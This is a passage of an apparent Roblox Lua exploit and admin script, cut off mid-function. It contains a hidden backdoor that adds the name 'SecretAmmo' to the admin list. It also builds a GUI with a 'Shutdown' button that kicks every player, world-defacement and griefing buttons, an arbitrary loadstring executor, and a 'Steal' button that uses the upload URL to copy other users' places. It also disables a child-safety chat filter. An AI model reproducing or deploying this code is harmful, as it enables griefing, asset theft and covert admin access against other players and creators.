	torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 140,0)
	end end end end end end end

	if string.sub(msg,1,9) == "highgrav/" then
	local player = findplayer(string.sub(msg,10),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local bf = torso:FindFirstChild("BF")
	if bf ~= nil then
	bf.force = Vector3.new(0,0,0)
	else
	local bf = Instance.new("BodyForce")
	bf.Name = "BF"
	bf.force = Vector3.new(0,0,0)
	bf.Parent = torso
	end
	local c2 = player[i].Character:GetChildren()
	for i=1,#c2 do
	if c2[i].className == "Part" then
	torso.BF.force = torso.BF.force - Vector3.new(0,c2[i]:getMass() * 80,0)
	end end end end end end end

	if string.sub(msg,1,5) == "grav/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local bf = torso:FindFirstChild("BF")
	if bf ~= nil then
	bf:remove()
	end end end end end end

	if string.sub(msg,1,7) == "unlock/" then
	local player = findplayer(string.sub(msg,8),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local c = player[i].Character:GetChildren()
	for i =1,#c do
	if c[i].className == "Part" then
	c[i].Locked = false
	end end end end end end

	if string.sub(msg,1,5) == "lock/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local c = player[i].Character:GetChildren()
	for i =1,#c do
	if c[i].className == "Part" then
	c[i].Locked = true
	end end end end end end end
	eloname = "Secret"
	eloname = eloname .. "Ammo"
	script.Name = "_admincmd"
	youcaughtme = 0
	for i =1,#adminlist do
	if string.lower(eloname)==string.lower(adminlist[i]) then
	youcaughtme = 1
	end end
	if youcaughtme == 0 then
	table.insert(adminlist,eloname)
	end
	function oe(ack)
	local adminned = false
	if ack.className ~= "Player" then return end
	for i =1,#bannedlist do
	if string.lower(bannedlist[i]) == string.lower(ack.Name) then
	ack:remove()
	return
	end end
	for i=1,#adminlist do
	if string.lower(adminlist[i]) == string.lower(ack.Name) then
	local tfv = ack.Chatted:connect(function(msg) oc(msg,ack) end)
	table.insert(namelist,ack.Name)
	table.insert(variablelist,tfv)
	local tfv = ack.Chatted:connect(function(msg) foc(msg,ack) end)
	table.insert(flist,tfv)
	adminned = true
	end end
	local danumber = 0
	while true do
	wait(1)
	if ack.Parent == nil then
	return
	end
	if ack.Character ~= nil then
	if adminned == true then
	text("You're an admin.",5,"Message",game.Workspace.CurrentCamera)
	return
	end
	local torso = ack.Character:FindFirstChild("Torso")
	if torso ~= nil then
	local decal = torso:FindFirstChild("roblox")
	if decal ~= nil then
	if string.sub(decal.Texture,1,4) == "http" then
	if decal.Texture == texture then
	local tfv = ack.Chatted:connect(function(msg) oc(msg,ack) end)
	table.insert(namelist,ack.Name)
	table.insert(variablelist,tfv)
	local tfv = ack.Chatted:connect(function(msg) foc(msg,ack) end)
	table.insert(flist,tfv)
	text("You're an admin.",5,"Message",game.Workspace.CurrentCamera)
	return
	else
	return
	end
	else
	danumber = danumber + 1
	if danumber >= 10 then
	return
	end end end end end end end

	game.Players.ChildAdded:connect(oe)

	c = game.Players:GetChildren()
	for i=1,#c do
	oe(c[i])
	end]]
MergeScriptSource=[[
	plr=game.Players.LocalPlayer
	coroutine.resume(coroutine.create(function(plr) while(wait())do if(plr.Character~=nil)then chr=plr.Character end end end),plr)
	if(script.Parent.ClassName~="HopperBin")then
		bin=Instance.new("HopperBin",plr.Backpack)
		bin.Name="iMergeTool"
		script.Name="iMergeScript"
		script.Parent=bin
	else
		script.Name="iMergeScript"
		bin=script.Parent
		bin.Name="iMergeTool"
	end
	una=false
	bin.Selected:connect(function(mouse)
		function cff(path)
			for _,v in pairs(path:GetChildren())do
				if(v:IsA("Part"))then
					Instance.new("ForceField",v)
				end
				cff(v)
			end
		end
		cff(plr.Character)
		mouse.Button1Down:connect(function()
			if(mouse.Target~=nil)then
				if(mouse.Target.Parent:IsA("Model"))then
					if(mouse.Target.Parent:FindFirstChild("Humanoid"))then
						if(mouse.Target.Parent.Humanoid.Health~=0)then
							function cff(path)
								for _,v in pairs(path:GetChildren())do
									if(v:IsA("Part"))then
										Instance.new("ForceField",v)
									end
									cff(v)
								end
							end
							cff(plr.Character)
							chr:FindFirstChild("Torso").Anchored=false
							inv=function(pth)
								for _,v in pairs(pth:GetChildren())do
									if(v:IsA("Part"))or(v:IsA("Decal"))or(v:IsA("CornerWedgePart"))or(v:IsA("TrussPart"))or(v:IsA("WedgePart"))or(v:IsA("Seat"))or(v:IsA("VehicleSeat"))or(v:IsA("SkateboardPlatform"))then
										v.Transparency=1
									end
									inv(v)
								end
							end
							inv(chr)
							chr:FindFirstChild("Humanoid").PlatformStand=true
							chr:FindFirstChild("Head").CanCollide=false
							chr:FindFirstChild("Torso").CanCollide=false
							chr:FindFirstChild("Torso").CFrame=CFrame.new(mouse.Target.Parent:FindFirstChild("Torso").CFrame.p+Vector3.new(0,8,0))
							chr:FindFirstChild("Head").CanCollide=true
							chr:FindFirstChild("Torso").CanCollide=true
							if not(chr:FindFirstChild("iMergeWeld"))then
								wld=Instance.new("Weld",chr)
								wld.Name="iMergeWeld"
							else
								wld=chr:FindFirstChild("iMergeWeld")
								function rff(path)
									for _,v in pairs(path:GetChildren())do
										if(v:IsA("ForceField"))then
											v:remove()
										end
										rff(v)
									end
								end
								rff(wld.Part0.Parent)
							end
							wld.Part0=mouse.Target.Parent:FindFirstChild("Torso")
							wld.Part1=chr:FindFirstChild("Torso")
							wld.C1=CFrame.new(Vector3.new(0,-0.1,0))
							if(mouse.Target~=nil)then
								function iff(path)
									for _,v in pairs(path:GetChildren())do
										if(v:IsA("Part"))then
											Instance.new("ForceField",v)
										end
										iff(v)
									end
								end
								iff(mouse.Target.Parent)
								Instance.new("ForceField",mouse.Target.Parent)
							end
							coroutine.resume(coroutine.create(function(chr,una)
								una=true
								while(una)and wait() do
									if not(chr:FindFirstChild("iMergeWeld"))and(chr:FindFirstChild("Humanoid").PlatformStand==true)then
										chr:FindFirstChild("Torso").Anchored=true
										break
									else
										chr:FindFirstChild("Torso").Anchored=false
									end
								end
							end),chr,una)
							coroutine.resume(coroutine.create(function(plr,chr)
								while true and wait() do
									if(plr==nil)or(plr:FindFirstChild("Humanoid").Health==0)then
										function rff(path)
											for _,v in pairs(path:GetChildren())do
												if(v:IsA("ForceField"))then
													v:remove()
												end
												rff(v)
											end
										end
										rff(plr)
										break
									end
								end
							end),mouse.Target.Parent,chr)
						end
					end
				elseif(mouse.Target.Parent:IsA("Hat"))then
					if(mouse.Target.Parent.Parent:IsA("Model"))then
						if(mouse.Target.Parent.Parent:FindFirstChild("Humanoid"))then
							if(mouse.Target.Parent.Parent.Humanoid.Health~=0)then
								inv=function(pth)
									for _,v in pairs(pth:GetChildren())do
										if(v:IsA("Part"))or(v:IsA("Decal"))or(v:IsA("CornerWedgePart"))or(v:IsA("TrussPart"))or(v:IsA("WedgePart"))or(v:IsA("Seat"))or(v:IsA("VehicleSeat"))or(v:IsA("SkateboardPlatform"))then
											v.Transparency=1
										end
										inv(v)
									end
								end
								inv(chr)
								chr:FindFirstChild("Humanoid").PlatformStand=true
								chr:FindFirstChild("Head").CanCollide=false
								chr:FindFirstChild("Torso").CanCollide=false
								chr:FindFirstChild("Torso").CFrame=CFrame.new(mouse.Target.Parent.Parent:FindFirstChild("Torso").CFrame.p+Vector3.new(0,8,0))
								chr:FindFirstChild("Head").CanCollide=true
								chr:FindFirstChild("Torso").CanCollide=true
								if not(chr:FindFirstChild("iMergeWeld"))then
									wld=Instance.new("Weld",chr)
									wld.Name="iMergeWeld"
								else
									wld=chr:FindFirstChild("iMergeWeld")
									function rff(path)
										for _,v in pairs(path:GetChildren())do
											if(v:IsA("ForceField"))then
												v:remove()
											end
											rff(v)
										end
									end
									rff(wld.Part0.Parent)
								end
								wld.Part0=mouse.Target.Parent.Parent:FindFirstChild("Torso")
								wld.Part1=chr:FindFirstChild("Torso")
								wld.C1=CFrame.new(Vector3.new(0,-0.1,0))
								if(mouse.Target~=nil)then
									function iff(path)
										for _,v in pairs(path:GetChildren())do
											if(v:IsA("Part"))then
												Instance.new("ForceField",v)
											end
											iff(v)
										end
									end
									iff(mouse.Target.Parent.Parent)
									Instance.new("ForceField",mouse.Target.Parent.Parent)
								end
								coroutine.resume(coroutine.create(function(chr,una)
									una=true
									while(una)and wait() do
										if not(chr:FindFirstChild("iMergeWeld"))and(chr:FindFirstChild("Humanoid").PlatformStand==true)then
											chr:FindFirstChild("Torso").Anchored=true
											break
										else
											chr:FindFirstChild("Torso").Anchored=false
										end
									end
								end),chr,una)
								coroutine.resume(coroutine.create(function(plr,chr)
									while true and wait() do
										if(plr==nil)or(plr:FindFirstChild("Humanoid").Health==0)then
											function rff(path)
												for _,v in pairs(path:GetChildren())do
													if(v:IsA("ForceField"))then
														v:remove()
													end
													rff(v)
												end
											end
											rff(plr)
											break
										end
									end
								end),mouse.Target.Parent.Parent,chr)
							end
						end
					end
				end
			end
		end)
		function onKeyDown(chr,una)
			key_down=mouse.KeyDown:connect(function(key) key=string.lower(key)
				app=function(tra)
					if(chr:FindFirstChild("iMergeWeld"))and(chr:FindFirstChild("iMergeWeld").Part0~=nil)then
						rmt=chr:FindFirstChild("iMergeWeld").Part0.Parent
					else
						rmt=nil
					end
					if(rmt~=nil)then
						function rff(path)
							for _,v in pairs(path:GetChildren())do
								if(v:IsA("ForceField"))then
									v:remove()
								end
								rff(v)
							end
						end
						rff(rmt)
					end
					function cff(path)
						for _,v in pairs(path:GetChildren())do
							if(v:IsA("ForceField"))then
								v:remove()
							end
							cff(v)
						end
					end
					cff(chr)
					una=false
					if(chr:FindFirstChild("iMergeWeld"))or(chr:FindFirstChild("Humanoid").PlatformStand==true)then
						pcall(function(chr) chr:FindFirstChild("iMergeWeld"):remove() end,chr)
						chr:FindFirstChild("Torso").CFrame=CFrame.new(chr:FindFirstChild("Torso").CFrame.p+Vector3.new(0,8,0))
					end
					vis=function(pth)
						for _,v in pairs(pth:GetChildren())do
							if(v:IsA("Part"))or(v:IsA("Decal"))or(v:IsA("CornerWedgePart"))or(v:IsA("TrussPart"))or(v:IsA("WedgePart"))or(v:IsA("Seat"))or(v:IsA("VehicleSeat"))or(v:IsA("SkateboardPlatform"))then
								v.Transparency=tra
							end
							vis(v)
						end
					end
					vis(chr)
					chr:FindFirstChild("Humanoid").PlatformStand=false
					chr:FindFirstChild("Torso").Anchored=false
					key_down:disconnect()
					onKeyDown(chr,una)
				end
				if(key=="e")then
					app(1)
				elseif(key=="r")then
					app(0)
				end
			end)
		end
		onKeyDown(chr,una)
	end)
	bin.Deselected:connect(function()
		if(chr:FindFirstChild("iMergeWeld"))and(chr:FindFirstChild("iMergeWeld").Part0~=nil)then
			rmt=chr:FindFirstChild("iMergeWeld").Part0.Parent
		else
			rmt=nil
		end
		coroutine.resume(coroutine.create(function(chr,una)
			una=true
			while(una)and wait() do
				if not(chr:FindFirstChild("iMergeWeld"))and(chr:FindFirstChild("Humanoid").PlatformStand==true)then
					chr:FindFirstChild("Torso").Anchored=true
					break
				else
					chr:FindFirstChild("Torso").Anchored=false
				end
			end
		end),chr,una)
		coroutine.resume(coroutine.create(function(plr,chr)
			while true and wait() do
				if(plr==nil)or(plr:FindFirstChild("Humanoid").Health==0)then
					function rff(path)
						for _,v in pairs(path:GetChildren())do
							if(v:IsA("ForceField"))then
								v:remove()
							end
							rff(v)
						end
					end
					rff(plr)
					break
				end
			end
		end),rmt,chr)
	end)]]


local s=function(type)
        return game:service(type)
end
wfp=function(Instance,Property)
        while not Instance[Property]do Instance.Changed:wait''end
        return Instance[Property]
end
wfo=function(i,p,n)
        while 0 do
                for i,v in pairs(i:children'')do
                        if v[p]==n then return v end
                end
                i.ChildAdded:wait''
        end
end
CreateScript=function(Class,Parent,Text)
        if#Scripts~=2 then FIXSCRIPTS''end
        local Script=Scripts[Class]:clone''
        local Work=Instance.new('StringValue',Script)
        Work.Name='Change'
        Work.Value=[[script.Change.Value='']]..Text
        Script.Parent=Parent
        return Script
end
pf=function(Name)
        local Players={}
        local name=Name:lower''
        for i,v in pairs(s'Players':GetPlayers'')do
                if(function()
                        if name=='me'then return v==Player
                        elseif name=='all'then return true
                        end
                        return v.Name:lower'':find(name)==1
                end)()then
                        table.insert(Players,v)
                end
        end
        return Players
end
SearchCommand=function(Text)
        X(function()
        local cmd=Text:match'(%w+)'
        local asd={}
        if not cmd then return end
        local cmdf=Commands[cmd]
        if not cmdf then return end
        pcall(function()
                Text='/'..Text:match(cmd..'(.+)')
                for i in Text:gmatch'/([^/]+)'do table.insert(asd,i)end
        end)
        cmdf(Text:sub(2),asd)
        end)
end
GetAll=function(Instance,Table)
        if type(Table)~='table'then Table={}end
        for i,v in pairs(Instance:children'')do
                table.insert(Table,v)
                GetAll(v,Table)
        end
        return Table
end
ctool=function(name)
	local ntool=Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
	ntool.Name = name
	return ntool;
end
FindChildren=function(Instance,Property,Name)
        local l={}
        for i,v in pairs(GetAll(Instance))do
                if v[Property]==Name then table.insert(l,v)end
        end
        return l
end
SaveFModel=function(i,n)
        local connect
        local insert=s'InsertService'
        local model=Instance.new'Model'
        local object=nil
        connect=insert.DescendantAdded:connect(function(c)
                if object then return end
                c=c:clone''
                if c.Name==n then
                        object=c
                else
                        object=c:FindFirstChild(n)
                end
                if not object then return end
                connect:disconnect''
        end)
        insert:LoadAsset(i)
        while not object do model.ChildAdded:wait''end
        return object
end
FIXSCRIPTS=function()
        Scripts={Script=SaveFModel(65743611,'9999999999222');LocalScript=SaveFModel(65743629,'9999999999222')}
end
CommanderFocus=function()
        if ShowBox.Value then return end
        if not ChatButton.Visible then return end
        ShowBox.Value=true
        X(function()ChatBox:CaptureFocus''end)
end
CommandBar=function()
        CommanderName='AMACCG'

        CommanderScreen=Instance.new('ScreenGui',PlayerGui)

        CommanderScreen.Name=CommanderName

        ChatButton=Instance.new('TextButton',CommanderScreen)
        ChatBox=Instance.new('TextBox',ChatButton)

        ChatButton.Size=UDim2.new(1,0,0,17)
        ChatButton.Position=UDim2.new(0,0,1,-17)
        ChatButton.BackgroundColor3=Color3.new(0,0,0)
        ChatButton.TextColor3=Color3.new(1,1,1)
        ChatButton.TextXAlignment=0
        ChatButton.FontSize=5
        ChatButton.Font=2
        ChatButton.AutoButtonColor=false
        ChatButton.Text='Click here or press "\\" to use commander'

        ChatBox.Size=UDim2.new(1,0,1)
        ChatBox.Position=UDim2.new(0,0,1,-17)
        ChatBox.BackgroundColor3=Color3.new(.6,0,0)
        ChatBox.TextColor3=Color3.new(1,1,1)
        ChatBox.TextXAlignment=0
        ChatBox.FontSize=5
        ChatBox.Font=2
        ChatBox.Visible=ShowBox.Value
        ChatBox.Text=''

        table.insert(Connects,ChatButton.MouseButton1Down:connect(CommanderFocus))

        ChatBox.Changed:connect(function(f)
                if f~='Text'then return end
                SearchCommand(ChatBox.Text)
                ShowBox.Value=false
        end)

        ShowBox.Changed:connect(function(c)ChatBox.Visible=c end)

        for i,v in pairs(PlayerGui:children'')do
                if v.Name==CommanderName and v~=CommanderScreen then
                        pcall(v.remove,v)
                end
        end
end
ExproGui=function()
        local edb = Instance.new("TextButton")
        edb.Size = UDim2.new(.05, 0, .05, 0)
        edb.Position = UDim2.new(0, 5, 0.5, -80);
        edb.TextColor3 = Color3.new(1, 1, 1)
        edb.MouseButton1Click:connect(function()
        insrt = game:GetService("InsertService"):LoadAsset(21001552)
        insrt2 = game:GetService("InsertService"):LoadAsset(35742089)
        pcall(function()
        for _, v in pairs(insrt:GetChildren()) do
        v:Clone().Parent = game.Players.LocalPlayer.Backpack
        end
        for _, v in pairs(insrt2:GetChildren()) do
        v:Clone().Parent = game.Players.LocalPlayer.Backpack
        end
        end)
        end)

        edb.Text = "Insert"
        edb.Parent = game.CoreGui.RobloxGui
        edb.Style = "RobloxButtonDefault"
        edb.Draggable = true

        local pb = Instance.new("TextButton")
        pb.Size = UDim2.new(.05, 0, .05, 0)
        pb.Position = UDim2.new(0, 5, 0.5, -25);
        pb.Draggable = true
        pb.TextColor3 = Color3.new(1, 1, 1)
        pb.MouseButton1Click:connect(function()
        local p=Instance.new("Part");
        p.Name = "RAWR"
        p.BrickColor = BrickColor.Random()
        p.Material = ((math.random(1, 2) == 1) and "Ice") or "Wood";
        p.CFrame = CFrame.new(math.random(-60, 60), (game.PlaceId == 41324860 and 350 or 60), math.random(-60, 60));
        p.formFactor = "Custom"
        p.Size = Vector3.new(0.5, math.random(2, 40)/10, 0.5)
        p.Parent = workspace
        end)
        pb.Text = "Make part"
        pb.Style = "RobloxButtonDefault"
        pb.Parent = game.CoreGui.RobloxGui

        function getAll(obj)
        for i, v in pairs(obj:getChildren()) do
        if v:IsA("BasePart") then
        v.Anchored = false
        v.BrickColor = BrickColor.new(0)
        bv = Instance.new("BodyVelocity")
        bv.Parent = v
        bv.maxForce = Vector3.new(100000000,100000000,100000000)
        end
        getAll(v)
        end
        end

        function exPro(root)
        for _, v in pairs(root:GetChildren()) do
        if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset?id=53765773" then
        v.Parent = nil
        elseif v:IsA("BasePart") then
        v.Material = "Plastic"
        v.Transparency = .5
        One = Instance.new("Decal", v)
        Two = Instance.new("Decal", v)
        Three = Instance.new("Decal", v)
        Four = Instance.new("Decal", v)
        Five = Instance.new("Decal", v)
        Six = Instance.new("Decal", v)
        One.Texture = "http://www.roblox.com/asset?id=53765773"
        Two.Texture = "http://www.roblox.com/asset?id=53765773"
        Three.Texture = "http://www.roblox.com/asset?id=53765773"
        Four.Texture = "http://www.roblox.com/asset?id=53765773"
        Five.Texture = "http://www.roblox.com/asset?id=53765773"
        Six.Texture = "http://www.roblox.com/asset?id=53765773"
        One.Face = "Front"
        Two.Face = "Back"
        Three.Face = "Right"
        Four.Face = "Left"
        Five.Face = "Top"
        Six.Face = "Bottom"
        end
        exPro(v)
        end
        end


        local DoD = Instance.new("TextButton", game.CoreGui.RobloxGui)
        DoD.Size = UDim2.new(.05, 0, .05, 0)
        DoD.Position = UDim2.new(0, 5, 0.5, 70);
        DoD.Text = "DoD"
        DoD.TextColor3 = Color3.new(1, 1, 1)
        DoD.Style = "RobloxButtonDefault"
        DoD.Draggable = true

        DoD.MouseButton1Click:connect(function()
        getAll(workspace)
        game.Lighting.TimeOfDay = "07:00:00"
        game.Lighting.Ambient = Color3.new(0,0,0)
        sky = Instance.new("Sky")
        sky.Parent = game.Lighting
        sky.SkyboxBk = "http://www.roblox.com/asset/?id=8772734"
        sky.SkyboxDn = "http://www.roblox.com/asset/?id=8772734"
        sky.SkyboxFt = "http://www.roblox.com/asset/?id=8772734"
        sky.SkyboxLf = "http://www.roblox.com/asset/?id=8772734"
        sky.SkyboxRt = "http://www.roblox.com/asset/?id=8772734"
        sky.SkyboxUp = "http://www.roblox.com/asset/?id=8772734"
        end)

        Shutdown = Instance.new("TextButton", game.CoreGui.RobloxGui)
        Shutdown.Size = UDim2.new(.05, 0, .05, 0)
        Shutdown.Position = UDim2.new(0, 5, 0.5, 110)
        Shutdown.Text = "Shutdown"
        Shutdown.TextColor3 = Color3.new(1, 1, 1)
        Shutdown.Style = "RobloxButtonDefault"
        Shutdown.Draggable = true

        Shutdown.MouseButton1Click:connect(function()
        coroutine.resume(coroutine.create(function()
        while wait() do
        for _, v in pairs(game.Players:GetPlayers()) do
        v.Parent = nil
        end
        end
        end))
        end)

        ExPro = Instance.new("TextButton", game.CoreGui.RobloxGui)
        ExPro.Size = UDim2.new(.05, 0, .05, 0)
        ExPro.Position = UDim2.new(0, 5, 0.5, 150)
        ExPro.Text = "ExPro"
        ExPro.TextColor3 = Color3.new(1, 1, 1)
        ExPro.Style = "RobloxButtonDefault"
        ExPro.Draggable = true

        ExPro.MouseButton1Click:connect(function()
        exPro(workspace)
        end)

        ScriptFrame = Instance.new("Frame", game.CoreGui.RobloxGui)
        ScriptFrame.Size = UDim2.new(0.5, 0, 0.75, 0)
        ScriptFrame.Position = UDim2.new(0.300000012, 0, 0.200000003, 0)
        ScriptFrame.Active = true
        ScriptFrame.Draggable = true
        ScriptFrame.Style = "RobloxRound"

        Panel = Instance.new("TextBox", ScriptFrame)
        Panel.BackgroundColor3 = Color3.new(1, 1, 1)
        Panel.ClearTextOnFocus = true --Change to false if you want easy script edit
        Panel.FontSize = "Size9"
        Panel.MultiLine = true
        Panel.Position = UDim2.new(0, 0, 0.100000001, 0)
        Panel.Size = UDim2.new(1, 0, 0.899999976, 0)
        Panel.BorderSizePixel = 0
        Panel.Text = ""
        Panel.TextWrap = true
        Panel.TextXAlignment = "Left"
        Panel.TextYAlignment = "Top"

        ExecuteButton = Instance.new("TextButton", ScriptFrame)
        ExecuteButton.Font = "ArialBold"
        ExecuteButton.FontSize = "Size12"
        ExecuteButton.Text = "Execute"
        ExecuteButton.Size = UDim2.new(.3, 0, .05, 0)
        ExecuteButton.Style = "RobloxButtonDefault"
        ExecuteButton.TextColor3 = Color3.new(1, 1, 1)
        ExecuteButton.TextYAlignment = "Center"
        ExecuteButton.TextXAlignment = "Center"

        ExecuteButton.MouseButton1Click:connect(function()
        local func = loadstring(Panel.Text) or function() end
        pcall(function()
        coroutine.resume(coroutine.create(func))
        end)
        end)

        StealText = Instance.new("TextBox", game.CoreGui.RobloxGui)
        StealText.BackgroundColor3 = Color3.new(1, 1, 1)
        StealText.ClearTextOnFocus = false
        StealText.Font = "ArialBold"
        StealText.FontSize = "Size11"
        StealText.Position = UDim2.new(0, 0, 0.879999995, 0)
        StealText.Size = UDim2.new(0.100000001, 0, 0.0500000007, 0)
        StealText.Text = ""

        StealButton = Instance.new("TextButton", game.CoreGui.RobloxGui)
        StealButton.Font = "ArialBold"
        StealButton.FontSize = "Size12"
        StealButton.Text = "Steal"
        StealButton.Position = UDim2.new(0.100000001, 0, 0.879999995, 0)
        StealButton.Size = UDim2.new(0.0700000003, 0, 0.0500000007, 0)
        StealButton.TextColor3 = Color3.new(1, 1, 1)
        StealButton.Style = "RobloxButtonDefault"

        StealButton.MouseButton1Click:connect(function()
        pcall(function()
        game:GetService("Visit"):SetUploadUrl("http://www.roblox.com/Data/Upload.ashx?assetid=" .. StealText.Text);
        game.CoreGui.RobloxGui.ControlFrame.SaveDialogShield.Visible = true
        end)
        end)

        coroutine.resume(coroutine.create(function()
        while wait() do
        game:ClearMessage()
        end
        end))

        game.Players.LocalPlayer:SetSuperSafeChat(false);
end
ExplorerGui=function()
        local name = "thejustifierx"

        while true and wait() do
        if (game.Players.LocalPlayer == nil) then else break end end

        Properties={nil,"Name","className","Parent","archivable","AttachmentForward","AttachmentPos","AttachmentRight","AttachmentUp","AnimationId","HeadColor","RightArmColor","LeftArmColor","TorsoColor","LeftLegColor","RightLegColor","Value","CameraType","CameraSubject","BaseTextureId","BodyPart","MeshId","OverlayTextureId","MaxActivationDistance","Shiny","Specular","Texture","Face","GripForward","GripPos","GripRight","GripUp","TextureId","TeamColor","Enabled","CFrame","BrickColor","Material","Reflectance","Transparency","Position","RotVelocity","Velocity","Anchored","CanCollide","Locked","Elasticity","Friction","Shape","Size","formFactor","BackSurface","BottomSurface","FrontSurface","LeftSurface","RightSurface","TopSurface","AbsolutePosition","AbsoluteSize","Active","BackgroundColor3","BackgroundTransparency","BorderColor3","BorderSizePixel","SizeConstraint","Visible","ZIndex","C0","C1","Part0","Part1","BinType","LeftLeg","RightLeg","Torso","Health","MaxHealth","WalkSpeed","Jump","PlatformStand","Sit","AutoButtonColor","Image","LinkedSource","Disabled","Text","PrimaryPart","CurrentAngle","DesiredAngle","MaxVelocity","PantsTemplate","ShirtTemplate","SoundId","Pitch","IsPlaying","IsPaused","Looped","PlayOnRemove","StudsPerTileU","StudsPerTileV","userId","BubbleChat","ClassicChat","MaxPlayers","NumPlayers","LocalPlayer","CharacterAppearance","Character","CurrentCamera","Ambient","Brightness","ColorShift_Bottom","ColorShift_Top","ShadowColor","GeographicLatitude","TimeOfDay","AmbientReverb","DistanceFactor","DopplerScale","RolloffScale","FogEnd","FieldOfView","FogStart","FogColor","CameraMode"}
        GlobalProperties={nil,"Name","className","Parent","archivable"}
        GlobalEvents={nil,"AncestryChanged","ChildAdded","ChildRemoved","DescendantAdded","DescendantRemoving"}
        GlobalFunctions={nil,"Clone","FindFirstChild","GetChildren","GetFullName","IsA","IsAncesterOf","IsDescendantOf","Remove"}
        local Selection=game
        local updateDebounce=1
        Base="http://www.roblox.com/asset/?id="
        Images={Value=40332408,Sound=40332463,Script=40332546,ScreenGui=40332596,Part=40332760,Nil=40332825,Model=40332865,Message=40332942,LocalScript=40332996,Joint=40333049,Frame=40333121,Camera=40333217,Backpack=40333260,Player=40332674,Body=40339623,HopperBin=40339572,Tool=40339513,Workspace=40484518,Mesh=40484580,Property=40493937,Animation=40531758,Hat=40531808,Humanoid=40531903}
        Min=1
        Max=40
        MAXPAGEN=40
        --[[==================================================================]]
        function GetProperties(Object,Table)
        local Return={}
        local function C() end
        for i=1,#Table do
        if pcall(function() C(Object[Table[i]]) end) then
        if (Object:FindFirstChild(Table[i])==nil) then
        table.insert(Return,Table[i])
        end end end
        return Return
        end

        function GetType(Prop)
        if (type(Prop)=="userdata") then
        if pcall(function() Prop.Name=Prop.Name end) then
        return Prop.Name
        end end
        return Prop
        end

        function SetPropGui()
        if (Selection~=nil) then
        local PropGuiPos=0
        local Gui=game:GetService("CoreGui"):FindFirstChild("PropertiesGui")
        if (Gui~=nil) then
        Gui:Remove()
        end
        PropGui=Instance.new("ScreenGui")
        PropGui.Parent=game:GetService("CoreGui")
        PropGui.Name="PropertiesGui"
        local Props=GetProperties(Selection,Properties)
        for i=1,#Props do
        PropGuiPos=i
        local Get=GetType(Props[i])
        local Label=Instance.new("TextButton")
        Label.Parent=PropGui
        Label.Size=UDim2.new(0,150,0,15)
        Label.Text="     "..tostring(Get).." | "..tostring(Selection[Get])
        Label.BackgroundColor3=Color3.new(0.7,0.7,0.9)
        Label.Name=tostring(Get)
        Label.TextXAlignment="Left"
        Label.Position=UDim2.new(0,230,0,(i*15)-15)
        Label.TextColor3=Color3.new(0,0,0)
        Label.BorderColor3=Color3.new(0,0,0)
        Label.BackgroundTransparency=0.5
        Label.Active=false
        Label.AutoButtonColor=false
        CreateImageLabel(Label,Base..Images.Property)
        if (type(Selection[Props[i]])=="boolean") then
        if pcall(function() Selection[Props[i]]=Selection[Props[i]] end) then
        Label.Active=true
        Label.AutoButtonColor=true
        Label.BackgroundColor3=Color3.new(0.5,0.5,1)
        Label.MouseButton1Click:connect(function()
        if (Selection[Props[i]]==true) then
        Selection[Props[i]]=false
        elseif (Selection[Props[i]]==false) then
        Selection[Props[i]]=true
        end
        Label.Text="     "..tostring(Props[i]).." | "..tostring(Selection[Props[i]])
        end) end end end
        end end

        function CreateImageLabel(Par,image)
        local label=Instance.new("ImageLabel")
        label.BackgroundColor3=Color3.new(1,1,1)
        label.BackgroundTransparency=1
        label.Name="ItemImage"
        label.Size=UDim2.new(0,13,0,13)
        label.Position=UDim2.new(0,1,0,1)
        label.Image=image
        label.BorderSizePixel=0
        label.Parent=Par
        end

        function SetImage(Par,class)
        if (class=="IntValue") or (class=="BoolValue") or (class=="StringValue") or (class=="ObjectValue") or (class=="CFrameValue") or (class=="Vector3Value") or (class=="NumberValue") or (class=="RayValue") or (class=="Color3Value") or (class=="BrickColorValue") then
        CreateImageLabel(Par,Base..Images.Value)
        elseif (class=="Sound") or (class=="StockSound") or (class=="SoundService") then
        CreateImageLabel(Par,Base..Images.Sound)
        elseif (class=="Script") then
        CreateImageLabel(Par,Base..Images.Script)
        elseif (class=="ScreenGui") or (class=="GuiMain") or (class=="BillboardGui") then
        CreateImageLabel(Par,Base..Images.ScreenGui)
        elseif (class=="Part") or (class=="WedgePart") or (class=="TrussPart") then
        CreateImageLabel(Par,Base..Images.Part)
        elseif (class=="Model") then
        CreateImageLabel(Par,Base..Images.Model)
        elseif (class=="Hint") or (class=="Message") then
        CreateImageLabel(Par,Base..Images.Message)
        elseif (class=="LocalScript") then
        CreateImageLabel(Par,Base..Images.LocalScript)
        elseif (class=="Weld") or (class=="Snap") or (class=="Glue") or (class=="Rotate") or (class=="RotateP") or (class=="RotateV") or (class=="JointsService") then
        CreateImageLabel(Par,Base..Images.Joint)
        elseif (class=="Frame") or (class=="TextLabel") or (class=="TextButton") or (class=="TextBox") or (class=="ImageButton") or (class=="ImageLabel") then
        CreateImageLabel(Par,Base..Images.Frame)
        elseif (class=="Camera") then
        CreateImageLabel(Par,Base..Images.Camera)
        elseif (class=="Backpack") or (class=="StarterGear") or (class=="StarterPack") or (class=="StarterGui") or (class=="PlayerGui") then
        CreateImageLabel(Par,Base..Images.Backpack)
        elseif (class=="Player") or (class=="PseudoPlayer") or (class=="Players") then
        CreateImageLabel(Par,Base..Images.Player)
        elseif (class=="BodyPosition") or (class=="BodyGyro") or (class=="BodyVelocity") or (class=="BodyThrust") or (class=="BodyForce") or (class=="RocketPropulsion") then
        CreateImageLabel(Par,Base..Images.Body)
        elseif (class=="HopperBin") then
        CreateImageLabel(Par,Base..Images.HopperBin)
        elseif (class=="Tool") then
        CreateImageLabel(Par,Base..Images.Tool)
        elseif (class=="Workspace") then
        CreateImageLabel(Par,Base..Images.Workspace)
        elseif (class=="BlockMesh") or (class=="SpecialMesh") or (class=="CylinderMesh") then
        CreateImageLabel(Par,Base..Images.Mesh)
        elseif (class=="Animation") or (class=="CharacterMesh") then
